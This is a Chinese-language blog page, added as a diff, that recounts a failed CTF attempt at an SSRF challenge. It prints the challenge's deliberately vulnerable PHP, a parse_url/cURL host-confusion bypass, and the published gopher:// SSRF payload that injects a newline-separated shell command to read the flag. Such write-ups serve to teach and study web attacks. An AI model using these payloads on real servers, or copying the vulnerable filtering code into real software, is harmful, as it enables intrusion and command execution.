@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    
+    <title>一次失败的CTF尝试记录（SSRF利用） | MyBlogs</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    
+      <meta name="google-site-verification" content="XXX" />
+    
+
+    
+
+    
+
+    
+
+    
+        <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🎮</text></svg>">
+    
+
+    
+
+    
+
+    
+<link rel="stylesheet" href="/dist/build.css?v=1637200696663.css">
+
+
+    
+<link rel="stylesheet" href="/dist/custom.css?v=1637200696663.css">
+
+
+    <script>
+        window.isPost = true
+        window.aomori = {
+            
+            
+            
+        }
+        window.aomori_logo_typed_animated = true
+        window.aomori_search_algolia = false
+
+    </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+
+    <div class="container">
+    <header class="header">
+        <div class="header-type">
+            
+            <div class="header-type-avatar avatar avatar-sm">
+                <img src="/images/avatar.jpg" alt="">
+            </div>
+            
+            <div class="header-type-inner">
+                
+                    <div id="typed-strings" style="display:none">
+                        <p>MyBlogs</p>
+                    </div>
+                    <a class="header-type-title" id="typed" href="/"></a>
+                
+    
+                
+            </div>
+        </div>
+        <div class="header-menu">
+            <div class="header-menu-inner">
+                
+                <a href="/">Home</a>
+                
+                <a href="/archives">Archives</a>
+                
+            </div>
+            <div class="header-menu-social">
+                
+    <a class="social" target="_blank" href="">
+        <box-icon type='' name=''></box-icon>
+    </a>
+
+    <a class="social" target="_blank" href="">
+        <box-icon type='' name=''></box-icon>
+    </a>
+
+            </div>
+        </div>
+
+        <div class="header-menu-mobile">
+            <div class="header-menu-mobile-inner" id="mobile-menu-open">
+                <i class="icon icon-menu"></i>
+            </div>
+        </div>
+    </header>
+
+    <div class="header-menu-mobile-menu">
+        <div class="header-menu-mobile-menu-bg"></div>
+        <div class="header-menu-mobile-menu-wrap">
+            <div class="header-menu-mobile-menu-inner">
+                <div class="header-menu-mobile-menu-close" id="mobile-menu-close">
+                    <i class="icon icon-cross"></i>
+                </div>
+                <div class="header-menu-mobile-menu-list">
+                    
+                    <a href="/">Home</a>
+                    
+                    <a href="/archives">Archives</a>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+    <div class="container">
+        <div class="main">
+            <section class="inner">
+                <section class="inner-main">
+                    <div class="post">
+    <article id="post-ckw68hqtc002kjs4z4ir24kvj" class="article article-type-post" itemscope
+    itemprop="blogPost">
+
+    <div class="article-inner">
+
+        
+          
+        
+        
+        
+
+        
+        <header class="article-header">
+            
+  
+    <h1 class="article-title" itemprop="name">
+      一次失败的CTF尝试记录（SSRF利用）
+    </h1>
+  
+
+        </header>
+        
+
+        <div class="article-more-info article-more-info-post hairline">
+
+            <div class="article-date">
+  <time datetime="2021-04-14T07:13:28.000Z" itemprop="datePublished">2021-04-14</time>
+</div>
+
+            
+            <div class="article-category">
+                <a class="article-category-link" href="/categories/Web%E6%B8%97%E9%80%8F/">Web渗透</a>
+            </div>
+            
+
+            
+            <div class="article-tag">
+                <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li></ul>
+            </div>
+            
+
+            
+            <div class="article-busuanzi">
+                有 <span id="busuanzi_value_page_pv">N</span> 人看过
+            </div>
+            
+
+        </div>
+
+        <div class="article-entry post-inner-html hairline" itemprop="articleBody">
+            <p>仅记录一次失败的CTF尝试（SSRF利用）。<span id="more"></span>访问url，获取index.php代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// include_once &quot;ping.php&quot;;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(check(<span class="variable">$link</span>))&#123;</span><br><span class="line">        <span class="variable">$curlobj</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$result</span> = curl_exec(<span class="variable">$curlobj</span>);</span><br><span class="line">        curl_close(<span class="variable">$curlobj</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;unknown error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$url</span> = parse_url(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$url</span>[<span class="string">&#x27;port&#x27;</span>]))&#123;    <span class="comment">//rewrite url if port exist</span></span><br><span class="line">        <span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]= <span class="string">&#x27;:&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;port&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;    <span class="comment"># filter scheme</span></span><br><span class="line">        <span class="keyword">if</span>(strcasecmp(<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>], <span class="string">&quot;ftp&quot;</span>) === <span class="number">0</span> || strcasecmp(<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>], <span class="string">&quot;telnet&quot;</span>) === <span class="number">0</span> || strcasecmp(<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>], <span class="string">&quot;dict&quot;</span>) === <span class="number">0</span> || strcasecmp(<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>], <span class="string">&quot;file&quot;</span>) === <span class="number">0</span> || strcasecmp(<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>], <span class="string">&quot;ldap&quot;</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-zA-Z]/&#x27;</span>, <span class="variable">$host</span>))&#123;</span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$host</span>;</span><br><span class="line">        <span class="keyword">if</span>(is_inner_ip_regx(<span class="variable">$ip</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$ip</span> = gethostbyname(<span class="variable">$host</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ip</span> ===<span class="variable">$host</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(is_inner_ip_regx(<span class="variable">$ip</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_inner_ip_regx</span>(<span class="params"><span class="variable">$ip</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&quot;/^(127\.0\.0\.1)|(localhost)|(10\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)|(172\.((1[6-9])|(2\d)|(3[01]))\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)|(192\.168\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)$/&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="variable">$pattern</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>直接访问ping.php,需要localhost访问<br><img src="https://img-blog.csdnimg.cn/20201013130822649.png#pic_center" alt="在这里插入图片描述"><br>本以为是修改XFF字段或者其他的代理字段，试了：X-Forwarded-For，X-real-ip，发现都不行。然后看index.php的代码，首先需要check为真才能curl访问。首先要确保url是内网IP，但是内网的话check是false，很鬼扯。</p>
+<p>仔细看下代码，逻辑上是绕不过去的，本以为还是绕过正则的，试了IPV6绕过[::1]，后续在本地搭环境是可以绕过的，代码也没报错，check()为真了，但是在实际测试中却是没有内容，失望+1。<br><img src="https://img-blog.csdnimg.cn/20201013133629981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>后续转移思路了，看到了parse_url()，baidu了two thousand years later…………<br>终于发现这个是可以通过构造：<a target="_blank" rel="noopener" href="http://foo%40localhost:80@114.114.114.114/ping.php%E8%BF%99%E6%A0%B7%E7%9A%84%E6%9E%84%E9%80%A0%E7%BB%95%E8%BF%87%E3%80%82">http://foo@localhost:80@114.114.114.114/ping.php这样的构造绕过。</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="comment">// include_once &quot;ping.php&quot;;</span></span><br><span class="line"><span class="variable">$link</span> = <span class="string">&quot;http://foo@localhost:80@114.114.114.114/test.txt&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(check(<span class="variable">$link</span>))&#123;</span><br><span class="line">    <span class="variable">$curlobj</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;link-&gt;&quot;</span>,<span class="variable">$link</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    curl_setopt(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$result</span> = curl_exec(<span class="variable">$curlobj</span>);</span><br><span class="line">    curl_close(<span class="variable">$curlobj</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;result-&gt;&quot;</span>,<span class="variable">$result</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;unknown error&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$url</span> = parse_url(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n----------------\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;port-&gt;&quot;</span>,<span class="variable">$url</span>[<span class="string">&#x27;port&#x27;</span>],<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;host1-&gt;&quot;</span>,<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>],<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;scheme-&gt;&quot;</span>,<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>],<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;path0-&gt;&quot;</span>,<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>],<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="comment">//http://[ :: ]:10007/ping.php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$url</span>[<span class="string">&#x27;port&#x27;</span>]))&#123;    <span class="comment">//rewrite url if port exist</span></span><br><span class="line">        <span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]= <span class="string">&#x27;:&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;port&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;path1-&gt;&quot;</span>,<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>],<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;    <span class="comment"># filter scheme</span></span><br><span class="line">        <span class="keyword">if</span>(strcasecmp(<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>], <span class="string">&quot;ftp&quot;</span>) === <span class="number">0</span> || strcasecmp(<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>], <span class="string">&quot;telnet&quot;</span>) === <span class="number">0</span> || strcasecmp(<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>], <span class="string">&quot;dict&quot;</span>) === <span class="number">0</span> || strcasecmp(<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>], <span class="string">&quot;file&quot;</span>) === <span class="number">0</span> || strcasecmp(<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>], <span class="string">&quot;ldap&quot;</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span>  <span class="string">&quot;scheme false\n&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-zA-Z]/&#x27;</span>, <span class="variable">$host</span>))&#123;<span class="comment">//host是数字组成的</span></span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$host</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ip-&gt;&quot;</span>,<span class="variable">$ip</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(is_inner_ip_regx(<span class="variable">$ip</span>))&#123;<span class="comment">//判断是不是内网ip</span></span><br><span class="line">            <span class="keyword">echo</span>  <span class="string">&quot;ip false1\n&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$ip</span> = gethostbyname(<span class="variable">$host</span>);<span class="comment">//是域名的话解析为IP</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ip-&gt;&quot;</span>,<span class="variable">$ip</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ip</span> ===<span class="variable">$host</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ip=host false\n&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(is_inner_ip_regx(<span class="variable">$ip</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span>  <span class="string">&quot;ip false2\n&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_inner_ip_regx</span>(<span class="params"><span class="variable">$ip</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&quot;/^(127\.0\.0\.1)|(localhost)|(10\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)|(172\.((1[6-9])|(2\d)|(3[01]))\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)|(192\.168\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)$/&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="variable">$pattern</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>测试下输出结果为：<br><img src="https://img-blog.csdnimg.cn/2020101313483549.png#pic_center" alt="在这里插入图片描述"><br>parse_url()解析的<code>$ip</code>不是内网IP，是<code>114.114.114.114</code>。<br>cURL解析的<code>$link</code>却是<code>localhost</code>。<br>如下图所示：<br><img src="https://img-blog.csdnimg.cn/20201013135340107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>又试了two thousand years later…………，因为中间构造了<code>http://foo@localhost:10007@114.114.114.114/ping.php</code>，重点是端口不对，这个坑爬了很久，获取了ping.php源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$remote_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$remote_ip</span> !== <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Can only be accessed on localhost&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">extract(<span class="variable">$_POST</span>); <span class="comment">//获取POST请求体中的参数数据</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$ip</span> ? <span class="variable">$ip</span> : <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$ip</span> = myescapeshellarg(<span class="variable">$ip</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;ping -c 1 <span class="subst">$ip</span>&quot;</span>;</span><br><span class="line">system(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myescapeshellarg</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = str_replace(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$data</span> = str_replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$data</span> = str_replace(<span class="string">&quot;;&quot;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$data</span> = str_replace(<span class="string">&quot;|&quot;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$data</span> = str_replace(<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$data</span> = str_replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&quot;\&quot;<span class="subst">$data</span>\&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一看不就是命令截断+注入么，被他娘的胜利冲昏了头，赶紧构造<code>url=HTTP://foo@localhost:80@114.114.114.114/ping.php&amp;ip=www.baidu.com</code>，试试截断<code>%0a,%0d,$&#123;IFS&#125;</code>，试了two thousand years later…………，不成功，还是ping的<code>127.0.0.1</code>。<br><img src="https://img-blog.csdnimg.cn/20201013140221815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>仔细想想，瞬间就傻了，我POST请求的就是ping.php，而ping.php中又要传递参数$ip去实现命令注入，相当于两个POST，一次发包怎么办得到，用&amp;ip这种连接显然是错误的。下一步应该是看看CURL协议，毕竟有个scheme过滤，准备去吃个饭回来继续看，发现大佬已经把答案公布了，一阵抽搐之后一切都索然无味了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=gopher:<span class="comment">//u:p@127.0.0.1:80@baidu.com/_POST+/ping.php+HTTP/1.1%250d%250aHost%3a+127.0.0.1%3a80%250d%250aConnection%3a+close%250d%250aContent-Type%3a+application/x-www-form-urlencoded%250d%250aContent-Length%3a+52%250d%250a%250d%250aip=%255c%2522%2509%250a%250acat$&#123;IFS&#125;/flag%2509%250a</span></span><br></pre></td></tr></table></figure>
+<p>URL解码之后：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">url=gopher://u:p@<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">80</span>@baidu.com/_POST /ping.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">80</span></span><br><span class="line">Connection: close</span><br><span class="line">Content-<span class="type">Type</span>: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">52</span></span><br><span class="line"></span><br><span class="line">ip=\<span class="string">&quot;	</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cat$&#123;IFS&#125;/flag	</span></span><br></pre></td></tr></table></figure>
+<p>一次次的不成功，尝试都在磨灭自己的耐心，不断地鼓励自己坚持，最后差一点点的却公布答案了，这感觉太TM不爽了，不爽归不爽，还是因为<strong>菜</strong>，撸起袖子加油干哦<br><img src="https://img-blog.csdnimg.cn/20201013142247310.png#pic_center" alt="在这里插入图片描述"></p>
+
+        </div>
+
+    </div>
+
+    
+
+    
+
+    
+
+    
+<div class="article-copyright hairline">
+  <p>
+    本作品采用 <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/">知识共享署名-非商业性使用-禁止演绎 4.0 国际许可协议</a> 进行许可。
+  </p>
+</div>
+
+
+    
+
+    
+<nav class="article-nav">
+  
+    <a href="/2021/04/15/Windows%20%E4%B8%8B%20Apache%202.4%20%E9%85%8D%E7%BD%AEhttp%E4%BB%A3%E7%90%86%E5%8F%8A%E8%AE%A4%E8%AF%81/" id="article-nav-newer" class="article-nav-link-wrap">
+      <div class="article-nav-caption">下一篇</div>
+      <div class="article-nav-title">
+        
+          Apache 2.4 配置http代理及认证
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/04/13/Chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C0Day%E5%A4%8D%E7%8E%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-caption">上一篇</div>
+      <div class="article-nav-title">Chrome浏览器远程代码执行0Day复现</div>
+    </a>
+  
+</nav>
+
+
+    <section class="share">
+        <div class="share-title">分享</div>
+        <a class="share-item" target="_blank"
